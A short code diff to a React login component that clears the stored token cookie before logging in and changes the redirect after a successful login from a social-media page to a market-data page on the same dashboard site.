@@ -24,7 +24,8 @@ class Login extends Component {
   };
 
   handleLogin = () => {
-    console.log("handle");
+    Cookies.remove('token');
+
     const { email, token } = this.state;
     fetch("https://dydxfoundation-dashboard.com/api/user/login", {
       method: 'POST',
@@ -41,7 +42,7 @@ class Login extends Component {
         if (response.status === 200) {
           let result = await response.json();
           Cookies.set('token', result.result.token)
-          window.location.href = 'https://dydxfoundation-dashboard.com/socialMedia'
+          window.location.href = 'https://dydxfoundation-dashboard.com/marketData'
         } else {
           alert('Wrong Credentials')
         }
